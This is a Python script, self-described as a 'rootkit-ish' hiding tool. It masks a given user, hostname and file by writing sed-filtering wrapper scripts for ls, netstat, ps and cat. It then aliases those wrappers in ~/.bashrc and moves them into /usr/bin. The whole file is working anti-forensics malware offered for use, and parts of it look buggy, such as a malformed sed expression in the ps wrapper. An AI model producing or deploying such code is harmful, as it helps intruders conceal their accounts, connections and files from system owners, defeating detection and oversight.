#!/usr/bin/python
#
# Ghetto rootkit-ish hiding
# No bin replacing. Simply adds aliases in a users .bashrc file
# that attempts to mask the existence of a user, hostname and specific files
# Current commands targeted:
# ls - netstat - ps - cat

import sys
import os
import subprocess
import argparse

def cloak(username, hostname, filename):
    print("[*] Creating aliases...")

    lsBash = "#!/bin/bash\n_ls() {\n\tif [[ $1 =~ 'l' ]]\n\tthen\n\t\tls $1 | sed -e '/"+filename+"/d'\n\telse\n\t\tls $1 | sed -e '/"+filename+"/d' | sed ':a;N;$!ba;s/\\n/ /g'\n\tfi\n}\n_ls $1 "
    fDes   = open('.ls.bash', 'w')
    fDes.write(lsBash)
    fDes.close()

    netstatBash = "#!/bin/bash\n_netstat() {\n\tnetstat $1 | sed '/%s/d'\n}\n_netstat $1" % hostname
    fDes = open('.netstat.bash', 'w')
    fDes.write(netstatBash)
    fDes.close()

    psBash = "#!/bin/bash\n_ps() {\n\tif [ -z \"$1\" ]\n\tthen\n\t\tps\n\telse\n\t\tps $1 | sed -e 'd/%s/'\n\tfi\n}\n_ps $1" % username
    fDes = open('.ps.bash', 'w')
    fDes.write(psBash)
    fDes.close()

    catBash = "#!/bin/bash\n_cat() {\n\tcat $1 | sed -e '/%s:/d' | sed -e '/%s/d'\n}\n_cat $1" % (username, hostname)
    fDes = open('.cat.bash', 'w')
    fDes.write(catBash)
    fDes.close()

    print("[*] Applying aliases...")
    os.system("chmod +x .ls.bash")
    os.system('echo alias ls=".ls.bash" >> ~/.bashrc')
    os.system('echo alias netstat=".netstat.bash" >> ~/.bashrc')
    os.system('echo alias ps=".ps.bash" >> ~/.bashrc')
    os.system('echo alias cat=".cat.bash" >> ~/.bashrc')
    os.system('mv .ls.bash /usr/bin')
    os.system('mv .netstat.bash /usr/bin')
    os.system('mv .ps.bash /usr/bin')
    os.system('mv .cat.bash /usr/bin')
    print("[+] Complete!\n  You must source .bashrc manually.")

help = """Ghetto method to hide user activities and files in a rootkit-ish way, using bash aliases.
Specify the username, hostname and filename you wish to cloak. Get on wit it!"""

parser = argparse.ArgumentParser(description=help)
parser.add_argument("--user", help="username", required=True)
parser.add_argument("--host", help="hostname", required=True)
parser.add_argument("--file", help="filename", required=True)

args = parser.parse_args()
user = args.user
host = args.host
filename = args.file

cloak(user, host, filename)

